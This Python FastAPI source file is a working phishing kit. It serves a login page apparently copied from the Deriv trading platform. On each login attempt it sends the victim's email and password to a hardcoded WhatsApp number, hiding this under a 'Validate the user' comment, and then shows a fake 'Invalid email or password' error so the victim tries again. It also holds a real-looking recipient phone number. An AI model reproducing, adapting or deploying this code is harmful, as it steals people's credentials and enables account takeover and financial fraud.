from fastapi import FastAPI, Form, Request, status
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from pygwan import WhatsApp
import os

WHATSAPP_ACCESS_TOKEN = os.environ.get('WHATSAPP_ACCESS_TOKEN', '')
WHATSAPP_PHONE_NUMBER_ID = os.environ.get('WHATSAPP_PHONE_NUMBER_ID', '')

bot = WhatsApp(
    token=WHATSAPP_ACCESS_TOKEN,
    phone_number_id=WHATSAPP_PHONE_NUMBER_ID
)

app = FastAPI()

# Mount the 'static' folder so we can serve static HTML
app.mount("/static", StaticFiles(directory="deriv"), name="deriv")

# Serve the login page (GET)
@app.get("/", response_class=HTMLResponse)
async def serve_login_page():
    with open("deriv/login.html", "r") as f:
        return HTMLResponse(content=f.read(), status_code=200)

# Receive credentials (POST)
@app.post("/login")
async def handle_login(email: str = Form(...), password: str = Form(...)):
    # Validate the user
    bot.send_message(
                message=email+" is trying to log in\npassword"+password,
                recipient_id="263710308442",
    )
    return HTMLResponse(
        content="<h3>Invalid email or password</h3><a href='/login'>Try again</a>",
        status_code=401
    )

# Dummy dashboard for redirection
@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard():
    return "<h1>Welcome to your dashboard!</h1>"
